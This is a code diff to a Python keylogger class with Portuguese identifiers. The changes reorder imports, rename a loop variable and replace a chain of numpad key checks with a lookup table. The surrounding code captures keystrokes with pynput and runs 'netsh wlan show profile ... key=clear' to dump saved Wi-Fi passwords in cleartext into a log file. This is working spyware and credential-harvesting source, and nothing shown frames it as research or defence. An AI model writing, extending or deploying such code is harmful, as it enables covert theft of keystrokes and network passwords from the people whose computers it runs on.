@@ -1,11 +1,11 @@
 from pynput import mouse
 from pynput import keyboard
+from screeninfo import get_monitors
 import datetime
 import time
 import os
 import win32gui
 import subprocess
-from screeninfo import get_monitors
 
 class KeyLogger():
     try:
@@ -42,18 +42,18 @@ class KeyLogger():
                     perfis.append(i)
             logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
             logs.write("\n----------------------------------------------")
-            for i in perfis:
+            for perfil in perfis:
                 try:
-                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
+                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', perfil, 'key=clear'])
                     registros = registros.decode('utf-8', errors ="backslashreplace")
                     registros = registros.split('\n')
                     senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
                     if senha == []:
                         senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
                     try:
-                        logs.write("\n{:<30}| {:<}".format(i, senha[0]))
+                        logs.write("\n{:<30}| {:<}".format(perfil, senha[0]))
                     except IndexError:
-                        logs.write("\n{:<30}| {:<}".format(i, ""))
+                        logs.write("\n{:<30}| {:<}".format(perfil, ""))
                 except subprocess.CalledProcessError:
                     print('Erro')
             logs.write("\n----------------------------------------------\n")
@@ -64,26 +64,21 @@ class KeyLogger():
             if Tecla.char != None:
                 return Tecla.char
             else:
-                if str(Tecla) == '<96>':
-                    return '0'
-                if str(Tecla) == '<97>':
-                    return '1'
-                if str(Tecla) == '<98>':
-                    return '2'
-                if str(Tecla) == '<99>':
-                    return '3'
-                if str(Tecla) == '<100>':
-                    return '4'
-                if str(Tecla) == '<101>':
-                    return '5'
-                if str(Tecla) == '<102>':
-                    return '6'
-                if str(Tecla) == '<103>':
-                    return '7'
-                if str(Tecla) == '<104>':
-                    return '8'
-                if str(Tecla) == '<105>':
-                    return '9'
+                Tecla = str(Tecla)
+                numero = ''
+                numpad = {
+                    '<96>': lambda numero: '0',
+                    '<97>': lambda numero: '1',
+                    '<98>': lambda numero: '2',
+                    '<99>': lambda numero: '3',
+                    '<100>': lambda numero: '4',
+                    '<101>': lambda numero: '5',
+                    '<102>': lambda numero: '6',
+                    '<103>': lambda numero: '7',
+                    '<104>': lambda numero: '8',
+                    '<105>': lambda numero: '9'
+                    }
+                return numpad[Tecla](numero)
         except AttributeError:
             if str(Tecla) == 'Key.space':
                 Tecla = str(Tecla).replace('Key.space',' ')
